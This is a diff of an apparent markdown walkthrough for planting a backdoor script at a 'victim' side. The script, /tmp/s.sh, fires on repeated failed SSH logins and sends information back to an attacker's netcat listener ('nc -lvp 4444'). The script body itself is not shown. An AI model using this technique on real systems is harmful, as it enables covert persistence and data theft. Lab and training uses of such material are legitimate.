@@ -29,7 +29,7 @@ sudo systemctl restart ssh
 
 
 #### Step2: Drop Backdoor script 
-At victim side. 
+At victim side.   
 **Backdoor script:** 
 ```
 #!/bin/bash 
@@ -46,6 +46,6 @@ listen for incoming connections.
 ```nc -lvp 4444```  
 Try repeatedly logging into the victim machine’s SSH with invalid credentials to generate authentication failures that will trigger the backdoor as shown below screenshot.  
 ```ssh user@<victimIp>```    
-Finally the output looks like below.  
+The ssh failures trigger the backdoor script /tmp/s.sh and sends the information back to attacker as shown below. Finally the output looks like below from attacker machine.  
 
 ![450890823-89aadc9b-46ca-4925-8996-c6305434d260](https://github.com/user-attachments/assets/4a75f2ed-9450-4e07-87aa-d0ecb26511f4)  
